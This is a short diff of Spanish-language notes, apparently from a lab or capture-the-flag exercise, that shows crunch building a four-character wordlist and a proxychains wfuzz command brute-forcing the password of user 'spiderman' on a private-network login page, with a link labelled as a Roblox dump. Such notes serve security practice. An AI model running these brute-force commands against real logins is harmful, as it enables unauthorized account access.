@@ -3,7 +3,7 @@ Dump de Roblox: https://pastebin.com/PgzqEEgW
 spiderman:
 Para no estar mirando la pantalla como tontos 2 horas, limpiamos la lista asumiendo que es de 4 caracteres y contiene solo caracteres contenidos en "01479bcdehi":
 crunch 4 4 01479bcdehi > alfanumerico_4
-proxychains wfuzz -c --hc=200 -z file,/root/alfanumerico_4 -d "username=spiderman&password=FUZZ&Submit=Logear" http://172.17.0.6/dump/login.php
+proxychains wfuzz -c --hc=200 -z file,/root/alfanumerico_4 -d "username=spiderman&password=FUZZ&Submit=Logear" http://172.30.150.4/login.php
 
 
 Enumeracion de usuarios en esta pagina tambien
